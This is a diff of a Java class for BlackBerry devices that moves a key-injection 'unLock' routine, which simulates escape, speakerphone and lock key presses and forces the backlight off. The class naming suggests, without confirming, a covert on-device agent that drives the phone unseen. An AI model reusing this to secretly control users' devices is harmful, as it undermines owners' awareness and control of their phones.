@@ -279,53 +279,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         return false;
     }
 
-    /**
-     * verifica se occorre procedere con l'unlock.
-     */
-    private void unLock() {
-        //#ifdef DEBUG
-        debug.trace("unLock: "
-                + ApplicationManager.getApplicationManager().isSystemLocked());
-        //#endif
-
-        if (status.backlightEnabled()) {
-            return;
-        }
-
-        try {
-
-            KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
-            Utils.sleep(300);
-
-            if (status.backlightEnabled()) {
-                //#ifdef DEBUG
-                debug.trace("Backlight still enabled, getHardwareLayout: "
-                        + Keypad.getHardwareLayout());
-                //#endif
-
-                KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
-                KeyInjector.pressRawKeyCode(KEY_LOCK);
-                status.setBacklight(false);
-                Utils.sleep(100);
-                status.setBacklight(false);
-                for (int i = 0; i < 10; i++) {
-                    if (status.backlightEnabled()) {
-                        //Backlight.enable(false);
-                        Utils.sleep(500);
-                        //#ifdef DEBUG
-                        debug.trace("unLock: backlight still enabled");
-                        //#endif
-                    } else {
-                        break;
-                    }
-                }
-
-            }
-        } finally {
-            //Main.getInstance().popBlack();
-        }
-    }
-
+ 
     private boolean checkForeground(String codname) {
         int foregroundPin = manager.getForegroundProcessId();
         ApplicationDescriptor[] apps = manager.getVisibleApplications();
@@ -391,6 +345,57 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         Utils.sleep(500);
         KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
 
+    }
+    
+    /**
+     * verifica se occorre procedere con l'unlock.
+     */
+    public static boolean unLock() {
+        //#ifdef DEBUG
+        debug.trace("unLock: "
+                + ApplicationManager.getApplicationManager().isSystemLocked());
+        //#endif
+
+        Status status=Status.self();
+        
+        if (status.backlightEnabled()) {
+            return false;
+        }
+
+        try {
+
+            KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
+            Utils.sleep(300);
+
+            if (status.backlightEnabled()) {
+                //#ifdef DEBUG
+                debug.trace("Backlight still enabled, getHardwareLayout: "
+                        + Keypad.getHardwareLayout());
+                //#endif
+
+                KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
+                KeyInjector.pressRawKeyCode(InjectorManager.KEY_LOCK);
+                status.setBacklight(false);
+                Utils.sleep(100);
+                status.setBacklight(false);
+                for (int i = 0; i < 10; i++) {
+                    if (status.backlightEnabled()) {
+                        //Backlight.enable(false);
+                        Utils.sleep(500);
+                        //#ifdef DEBUG
+                        debug.trace("unLock: backlight still enabled");
+                        //#endif
+                    } else {
+                        return true;
+                        
+                    }
+                }
+
+            }
+        } finally {
+            //Main.getInstance().popBlack();
+        }
+        return false;
     }
 
     private void removeSystemMenu() {
